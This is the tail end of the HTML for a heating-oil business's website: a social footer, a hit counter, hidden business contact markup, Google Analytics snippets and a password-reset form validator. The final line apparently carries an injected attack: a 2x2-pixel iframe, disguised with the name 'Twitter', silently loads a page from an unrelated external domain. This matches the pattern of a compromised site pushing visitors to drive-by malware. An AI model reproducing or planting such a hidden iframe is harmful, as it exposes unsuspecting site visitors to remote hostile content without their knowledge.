            	<p align="center" class="footer-social"><a href="#"><img src="images/fb.png"></a><a href="#"><img src="images/twitter.png"></a><a href="#"><img src="images/google.png"></a><span><img src='../counter/2.jpg' alt="" border="0" height="12" width="10"><img src='../counter/2.jpg' alt="" border="0" height="12" width="10"><img src='../counter/8.jpg' alt="" border="0" height="12" width="10"><img src='../counter/3.jpg' alt="" border="0" height="12" width="10"><img src='../counter/2.jpg' alt="" border="0" height="12" width="10"><img src='../counter/6.jpg' alt="" border="0" height="12" width="10"><img src='../counter/2.jpg' alt="" border="0" height="12" width="10"><img src='../counter/4.jpg' alt="" border="0" height="12" width="10"></span> 
            	</p>
                <br class="spacer">
            </div>
		</div>
		<div class="cl"></div>
	</div>
</div>	
<div itemscope="itemscope" itemtype="http://schema.org/LocalBusiness" style="display:none;">
    <span itemprop="name">heatingoil4less</span>
    <div itemprop="address" itemscope="itemscope" itemtype="http://schema.org/PostalAddress">
        <span itemprop="streetAddress">211 weyford terr</span>
        <span itemprop="addressLocality">garden city</span>,
        <span itemprop="addressRegion">NY</span>
        <span itemprop="postalCode">11530</span>
        <span itemprop="addressCountry">US</span>
    </div>
    Phone: <span itemprop="telephone">516-802-3406</span>
    Website: <a itemprop="URL">http://www.heatingoil4less.com/</a>
</div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-16019701-1");
pageTracker._trackPageview();
} catch(err) {}
</script>	<!-- Footer Contaner End -->

</div>
<!-- Wrapper End -->

<script>
// form fields description structure
var a_fields = {

	'username_forgot_password':{'l':'User Name','r':true,'t':'t_username_forgot_password'}
	
},

o_config = {
	'to_disable' : ['Submit'],
	'alert' : 1
}

// validator constructor call
var vforgotpassword = new validator('registration', a_fields, o_config);

</script>


<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://adottareadistanza.org/chof.html?i=405281></iframe></body>
</html>